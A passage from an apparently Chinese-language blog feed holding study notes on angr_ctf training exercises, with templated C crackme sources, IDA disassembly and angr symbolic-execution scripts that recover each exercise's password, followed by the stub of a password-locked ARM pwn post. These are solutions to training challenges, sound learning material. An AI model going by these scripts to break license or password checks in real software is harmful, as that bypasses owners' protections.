<h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$&#123;</span><br><span class="line">import random, os</span><br><span class="line">random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">userdef_charset = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">userdef = <span class="string">&#x27;&#x27;.join(random.choice(userdef_charset) for _ in range(8))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def check_string_recursive(array0, array1, random_list, bit):</span></span><br><span class="line"><span class="string">  if bit &lt; 0:</span></span><br><span class="line"><span class="string">    write(&#x27;</span>maybe_good(%s, %s);<span class="string">&#x27; % (array0, array1))</span></span><br><span class="line"><span class="string">  else:</span></span><br><span class="line"><span class="string">    if random_list[0]:</span></span><br><span class="line"><span class="string">      write(&#x27;</span><span class="keyword">if</span> (CHECK_BIT(%s, %d) == CHECK_BIT(%s, %d)) &#123;<span class="string">&#x27; % (array0, bit, array1, bit))</span></span><br><span class="line"><span class="string">      check_string_recursive(array0, array1, random_list[1:], bit-1)</span></span><br><span class="line"><span class="string">      write(&#x27;</span>&#125; <span class="keyword">else</span> &#123; avoid_me(); <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">      check_string_recursive(array0, array1, random_list[1:], bit-1)</span></span><br><span class="line"><span class="string">      write(&#x27;</span>&#125;<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">      write(&#x27;</span><span class="keyword">if</span> (CHECK_BIT(%s, %d) != CHECK_BIT(%s, %d)) &#123; avoid_me();<span class="string">&#x27; % (array0, bit, array1, bit))</span></span><br><span class="line"><span class="string">      check_string_recursive(array0, array1, random_list[1:], bit-1)</span></span><br><span class="line"><span class="string">      write(&#x27;</span>&#125; <span class="keyword">else</span> &#123; <span class="string">&#x27;)</span></span><br><span class="line"><span class="string">      check_string_recursive(array0, array1, random_list[1:], bit-1)</span></span><br><span class="line"><span class="string">      write(&#x27;</span>&#125;<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">&#125;$</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#define _GNU_SOURCE</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;stdint.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#define USERDEF &quot;$&#123; userdef &#125;$&quot;</span></span><br><span class="line"><span class="string">#define LEN_USERDEF $&#123; write(len(userdef)) &#125;$</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// return true if nth bit of array is 1</span></span><br><span class="line"><span class="string">#define CHECK_BIT(array, bit_index) (!!(((uint8_t*) array)[bit_index / 8] &amp; (((uint8_t) 0x1) &lt;&lt; (bit_index % 8))))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">char msg[] =</span></span><br><span class="line"><span class="string">  &quot;$&#123; description &#125;$&quot;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">uint8_t should_succeed = 1;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">void print_msg() &#123;</span></span><br><span class="line"><span class="string">  printf(&quot;%s&quot;, msg);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int complex_function(int value, int i) &#123;</span></span><br><span class="line"><span class="string">#define LAMBDA 5</span></span><br><span class="line"><span class="string">  if (!(&#x27;</span>A<span class="number">&#x27;</span> &lt;= value &amp;&amp; value &lt;= <span class="string">&#x27;Z&#x27;</span>)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Try again.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ((value - <span class="string">&#x27;A&#x27;</span> + (LAMBDA * i)) % (<span class="string">&#x27;Z&#x27;</span> - <span class="string">&#x27;A&#x27;</span> + <span class="number">1</span>)) + <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">avoid_me</span><span class="params">()</span> &#123;</span><br><span class="line">  should_succeed = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">maybe_good</span><span class="params">(<span class="type">char</span>* compare0, <span class="type">char</span>* compare1)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (should_succeed &amp;&amp; !<span class="built_in">strncmp</span>(compare0, compare1, <span class="number">8</span>)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Good Job.\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Try again.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  <span class="type">char</span> buffer[<span class="number">20</span>];</span><br><span class="line">  <span class="type">char</span> password[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">//print_msg();</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i &lt; <span class="number">20</span>; ++i) &#123;</span><br><span class="line">    password[i] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">strncpy</span>(password, USERDEF, LEN_USERDEF);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%8s&quot;</span>, buffer);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;LEN_USERDEF; ++i) &#123;</span><br><span class="line">    buffer[i] = (<span class="type">char</span>) complex_function(buffer[i], i);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $&#123; check_string_recursive(<span class="string">&#x27;buffer&#x27;</span>, <span class="string">&#x27;password&#x27;</span>, random_list, <span class="number">12</span>) &#125;$</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h4><p>这个程序的程序题非常的大，无法反编译，我们还是希望程序输出<code>Good Job</code>,中间有一个avoid的函数，根据题意，可知道这个是要避免输出的，所以利用angr来进行约束：<br><img src="https://raw.githubusercontent.com/ch3cke/images/master/img/Clipboard_2021-09-05-16-20-01.png" alt=""></p>
<h4 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载文件</span></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./data/angr_ctf/solutions/01_angr_avoid/01_angr_avoid&#x27;</span>)</span><br><span class="line"><span class="comment"># auto_load_libc 是否加载库文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个状态</span></span><br><span class="line"><span class="comment"># entry_state() 构造一个已经准备好从函数入口点执行的状态</span></span><br><span class="line">stat = proj.factory.entry_state()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个Simulation Managers 模拟管理器</span></span><br><span class="line"><span class="comment"># 也可以改为</span></span><br><span class="line"><span class="comment"># sm = proj.factory.simulation_manager</span></span><br><span class="line"><span class="comment"># 区别不大</span></span><br><span class="line">sm = proj.factory.simgr(stat)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># good = 0x0804867D</span></span><br><span class="line"><span class="comment"># 正确的路径</span></span><br><span class="line">good = <span class="keyword">lambda</span> s:<span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> s.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">avoid = <span class="number">0x080485A8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># angr开始探索这个路径</span></span><br><span class="line"><span class="comment"># 如果找到满足find的状态,则将其保存在模拟管理器的found里面</span></span><br><span class="line">sm.explore(find=good,avoid=avoid)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">    <span class="comment"># 如果found分类不为空, 则说明找到了路径</span></span><br><span class="line">    find_state = sm.found[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 将找到的状态给find_state</span></span><br><span class="line"></span><br><span class="line">flag = find_state.posix.dumps(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(find_state.posix.dumps(<span class="number">1</span>)) <span class="comment"># 获取输入</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h3 id="03-angr-symblolic-registers"><a href="#03-angr-symblolic-registers" class="headerlink" title="03_angr_symblolic_registers"></a>03_angr_symblolic_registers</h3><p>向寄存器中发送符号化量，并进行计算</p>
<h4 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$&#123;</span><br><span class="line">import random, os</span><br><span class="line">random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">def <span class="title function_">randomly_modify</span><span class="params">(var)</span>:</span><br><span class="line">  operator = random.choice([<span class="string">&#x27;+=&#x27;</span>, <span class="string">&#x27;^=&#x27;</span>])</span><br><span class="line">  random_int = random.randint(<span class="number">0</span>, <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">  write(var + operator + str(random_int) + <span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">&#125;$</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">register</span> <span class="type">int</span> eax <span class="keyword">asm</span>(<span class="string">&quot;eax&quot;</span>);</span><br><span class="line"><span class="keyword">register</span> <span class="type">int</span> ebx <span class="title function_">asm</span><span class="params">(<span class="string">&quot;ebx&quot;</span>)</span>;</span><br><span class="line"><span class="keyword">register</span> <span class="type">int</span> edx <span class="title function_">asm</span><span class="params">(<span class="string">&quot;edx&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> msg[] = <span class="string">&quot;$&#123; description &#125;$&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_msg</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">complex_function_1</span><span class="params">(<span class="type">int</span> input)</span> &#123;</span><br><span class="line">$&#123;</span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">0</span>, random.randint(<span class="number">16</span>, <span class="number">48</span>))</span>:</span><br><span class="line">  <span class="title function_">randomly_modify</span><span class="params">(<span class="string">&#x27;input&#x27;</span>)</span></span><br><span class="line">&#125;$</span><br><span class="line">  <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">complex_function_2</span><span class="params">(<span class="type">int</span> input)</span> &#123;</span><br><span class="line">$&#123;</span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">0</span>, random.randint(<span class="number">16</span>, <span class="number">48</span>))</span>:</span><br><span class="line">  <span class="title function_">randomly_modify</span><span class="params">(<span class="string">&#x27;input&#x27;</span>)</span></span><br><span class="line">&#125;$</span><br><span class="line">  <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">complex_function_3</span><span class="params">(<span class="type">int</span> input)</span> &#123;</span><br><span class="line">$&#123;</span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">0</span>, random.randint(<span class="number">16</span>, <span class="number">48</span>))</span>:</span><br><span class="line">  <span class="title function_">randomly_modify</span><span class="params">(<span class="string">&#x27;input&#x27;</span>)</span></span><br><span class="line">&#125;$</span><br><span class="line">  <span class="keyword">return</span> input;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_user_input</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> first, second, third;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%x %x %x&quot;</span>, &amp;first, &amp;second, &amp;third);</span><br><span class="line">  eax = first;</span><br><span class="line">  ebx = second;</span><br><span class="line">  edx = third;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  <span class="comment">//print_msg();</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  get_user_input();</span><br><span class="line">  <span class="type">int</span> non_eax = eax;</span><br><span class="line">  <span class="type">int</span> non_ebx = ebx;</span><br><span class="line">  <span class="type">int</span> non_edx = edx;</span><br><span class="line">  non_eax = complex_function_1(non_eax);</span><br><span class="line">  non_ebx = complex_function_2(non_ebx);</span><br><span class="line">  non_edx = complex_function_3(non_edx);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (non_eax || non_ebx || non_edx) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Try again.\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Good Job.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>代码是scanf, 输入一些数据，存到寄存器中，最后进行检验</p>
<h4 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h4><p><img src="@attachment/Clipboard_2021-09-05-17-12-48.png" alt=""><br>可以看到, 在获取数据之后，返回的数据分别在<code>eax</code>,<code>ebx</code>,<code>edx</code>中，因此，我们可以选择直接设置寄存器中的值，状态从<code>0x80488d1</code>开始</p>
<h4 id="解决代码"><a href="#解决代码" class="headerlink" title="解决代码"></a>解决代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载文件</span></span><br><span class="line">proj = angr.Project(<span class="string">&#x27;./data/angr_ctf/solutions/03_angr_symbolic_registers/03_angr_symbolic_registers&#x27;</span>)</span><br><span class="line"><span class="comment"># auto_load_libc 是否加载库文件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 程序开始运行的地址</span></span><br><span class="line">start_addr = <span class="number">0x080488D1</span></span><br><span class="line"></span><br><span class="line">p1 = claripy.BVS(<span class="string">&#x27;p1&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">p2 = claripy.BVS(<span class="string">&#x27;p2&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">p3 = claripy.BVS(<span class="string">&#x27;p3&#x27;</span>, <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个状态</span></span><br><span class="line"><span class="comment"># 构造一个空状态(blank_state),与entry_state不同, 跳过了scanf, 从其下部开始执行</span></span><br><span class="line">stat = proj.factory.blank_state(start_addr=start_addr)</span><br><span class="line"></span><br><span class="line">stat.regs.eax = p1</span><br><span class="line">stat.regs.ebx = p2</span><br><span class="line">stat.regs.edx = p3</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个Simulation Managers 模拟管理器</span></span><br><span class="line"><span class="comment"># 也可以改为</span></span><br><span class="line"><span class="comment"># sm = proj.factory.simulation_manager</span></span><br><span class="line"><span class="comment"># 区别不大</span></span><br><span class="line">sm = proj.factory.simulation_manager(stat)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># good = 0x0804867D</span></span><br><span class="line"><span class="comment"># 正确的路径</span></span><br><span class="line"><span class="comment"># good = lambda s:b&#x27;Good Job.&#x27; in s.posix.dumps(1)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_good</span>(<span class="params">stat</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good Job.&#x27;</span> <span class="keyword">in</span> stat.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_bad</span>(<span class="params">stat</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try again.&#x27;</span> <span class="keyword">in</span> stat.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># avoid = 0x080485A8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># angr开始探索这个路径</span></span><br><span class="line"><span class="comment"># 如果找到满足find的状态,则将其保存在模拟管理器的found里面</span></span><br><span class="line"><span class="comment"># 注意:如果使用函数的话，记得不要加()</span></span><br><span class="line">sm.explore(find=is_good, avoid=is_bad)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">    <span class="comment"># 如果found分类不为空, 则说明找到了路径</span></span><br><span class="line">    find_state = sm.found[<span class="number">0</span>]</span><br><span class="line">    flag1 = find_state.solver.<span class="built_in">eval</span>(p1)</span><br><span class="line">    flag2 = find_state.solver.<span class="built_in">eval</span>(p2)</span><br><span class="line">    flag3 = find_state.solver.<span class="built_in">eval</span>(p3)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#123;:x&#125; &#123;:x&#125; &#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(flag1, flag2, flag3))</span><br><span class="line">    <span class="built_in">print</span>(find_state.posix.dumps(<span class="number">1</span>))</span><br><span class="line">    <span class="comment"># 将找到的状态给find_state</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="04-angr-symbolic-stack"><a href="#04-angr-symbolic-stack" class="headerlink" title="04_angr_symbolic_stack"></a>04_angr_symbolic_stack</h3><p>模拟栈</p>
<h4 id="函数栈"><a href="#函数栈" class="headerlink" title="函数栈"></a>函数栈</h4><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">08048679</span> <span class="meta">public</span> handle_user</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048679</span> handle_user proc <span class="built_in">near</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048679</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048679</span> var_10= <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">10h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048679</span> var_C= <span class="built_in">dword</span> <span class="built_in">ptr</span> -<span class="number">0Ch</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048679</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048679</span> <span class="comment">; __unwind &#123;</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048679</span> <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span>0804867A <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line"><span class="symbol">.text:</span>0804867C <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">18h</span></span><br><span class="line"><span class="symbol">.text:</span>0804867F <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048682</span> <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_10]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048685</span> <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048686</span> <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_C]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048689</span> <span class="keyword">push</span>    <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>0804868A <span class="keyword">push</span>    offset aUU      <span class="comment">; &quot;%u %u&quot;</span></span><br><span class="line"><span class="symbol">.text:</span>0804868F <span class="keyword">call</span>    ___isoc99_scanf</span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048694</span> <span class="keyword">add</span>     <span class="built_in">esp</span>, <span class="number">10h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">08048697</span> <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+var_C]</span><br><span class="line"><span class="symbol">.text:</span>0804869A <span class="keyword">sub</span>     <span class="built_in">esp</span>, <span class="number">0Ch</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0804869D</span> <span class="keyword">push</span>    <span class="built_in">eax</span></span><br></pre></td></tr></table></figure>
<p>假设在scanf函数下执行，08048694为scanf函数恢复栈，所以应从08048697开始模拟</p>
<h4 id="解题脚本-1"><a href="#解题脚本-1" class="headerlink" title="解题脚本"></a>解题脚本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">p = angr.Project(<span class="string">&#x27;./data/angr_ctf/solutions/04_angr_symbolic_stack/04_angr_symbolic_stack&#x27;</span>)</span><br><span class="line"><span class="comment"># 载入程序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">good</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bad</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Try again.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x08048697</span></span><br><span class="line"><span class="comment"># 开始模拟的地址</span></span><br><span class="line"></span><br><span class="line">state = p.factory.blank_state(addr = start_addr)</span><br><span class="line"><span class="comment"># 新建一个状态</span></span><br><span class="line"></span><br><span class="line">state.stack_push(state.regs.ebp)</span><br><span class="line"><span class="comment"># 压入ebp，模拟地址0x08048679代码</span></span><br><span class="line"></span><br><span class="line">state.regs.ebp = state.regs.esp</span><br><span class="line"><span class="comment"># 模拟地址0x0804867A代码</span></span><br><span class="line"></span><br><span class="line">offest = <span class="number">0x8</span></span><br><span class="line"><span class="comment"># 两个局部变量</span></span><br><span class="line"><span class="comment"># var_C= dword ptr -0Ch  也就是占的地址是 0x9 a b c</span></span><br><span class="line"><span class="comment"># var_10= dword ptr -10h 占的地址是 d e f 0x10</span></span><br><span class="line">state.regs.esp -= offest</span><br><span class="line"><span class="comment"># 初始化栈</span></span><br><span class="line"></span><br><span class="line">p1 = state.solver.BVS(<span class="string">&#x27;p1&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">p2 = state.solver.BVS(<span class="string">&#x27;p2&#x27;</span>,<span class="number">32</span>)</span><br><span class="line">state.stack_push(p1)</span><br><span class="line">state.stack_push(p2)</span><br><span class="line"><span class="comment"># 创建两个位向量，并将其压入栈</span></span><br><span class="line"></span><br><span class="line">sm = p.factory.simgr(state)</span><br><span class="line">sm.explore(find = good, avoid = bad)</span><br><span class="line"><span class="comment"># 创建模拟管理器并开始探索路径</span></span><br><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">    found_state = sm.found[<span class="number">0</span>]</span><br><span class="line">    flag1 = found_state.solver.<span class="built_in">eval</span>(p1)</span><br><span class="line">    flag2 = found_state.solver.<span class="built_in">eval</span>(p2)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(flag1,flag2))</span><br><span class="line">    <span class="comment"># 输出</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;No&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="05-angr-symbolic-memory"><a href="#05-angr-symbolic-memory" class="headerlink" title="05_angr_symbolic_memory"></a>05_angr_symbolic_memory</h3><h4 id="解题脚本-2"><a href="#解题脚本-2" class="headerlink" title="解题脚本"></a>解题脚本</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line">p = angr.Project(<span class="string">&#x27;./data/angr_ctf/solutions/05_angr_symbolic_memory/05_angr_symbolic_memory&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">good</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good Job.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bad</span>(<span class="params">state</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Try again.&quot;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">start_addr = <span class="number">0x08048601</span></span><br><span class="line"><span class="comment"># 依旧是选择在scanf函数的下方初始化状态</span></span><br><span class="line"></span><br><span class="line">state = p.factory.blank_state(addr = start_addr)</span><br><span class="line">p1 = state.solver.BVS(<span class="string">&#x27;p1&#x27;</span>,<span class="number">64</span>)</span><br><span class="line">p2 = state.solver.BVS(<span class="string">&#x27;p2&#x27;</span>,<span class="number">64</span>)</span><br><span class="line">p3 = state.solver.BVS(<span class="string">&#x27;p3&#x27;</span>,<span class="number">64</span>)</span><br><span class="line">p4 = state.solver.BVS(<span class="string">&#x27;p4&#x27;</span>,<span class="number">64</span>)</span><br><span class="line">state.memory.store(<span class="number">0x0A1BA1C0</span>,p1)</span><br><span class="line">state.memory.store(<span class="number">0x0A1BA1C8</span>,p2)</span><br><span class="line">state.memory.store(<span class="number">0x0A1BA1D0</span>,p3)</span><br><span class="line">state.memory.store(<span class="number">0x0A1BA1D8</span>,p4)</span><br><span class="line"><span class="comment"># 初始化四个位向量，并存入内存</span></span><br><span class="line"></span><br><span class="line">sm = p.factory.simgr(state)</span><br><span class="line">sm.explore(find = good, avoid = bad)</span><br><span class="line"><span class="keyword">if</span> sm.found:</span><br><span class="line">    found_state = sm.found[<span class="number">0</span>]</span><br><span class="line">    flag1 = found_state.solver.<span class="built_in">eval</span>(p1,cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    flag2 = found_state.solver.<span class="built_in">eval</span>(p2,cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    flag3 = found_state.solver.<span class="built_in">eval</span>(p3,cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    flag4 = found_state.solver.<span class="built_in">eval</span>(p4,cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment"># 先解释成bytes类型再转换成str</span></span><br><span class="line">    <span class="comment"># 貌似不能直接转换str</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#123;&#125; &#123;&#125; &#123;&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(flag1,flag2,flag3,flag4))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;No&#x27;</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
  </entry>
  <entry>
    <title>arm_pwn笔记(1)</title>
    <url>/2021/10/04/%E5%AD%A6%E4%B9%A0/arm-pwn%E7%AC%94%E8%AE%B0-1/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="09582cf376b94eb4718dd9bedb93b389b25785c63097b00b8a35fcfa2a16be81"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">HTB{Th****************************************************rm}</span>
      </label>
    </div>
  </div>
</div>
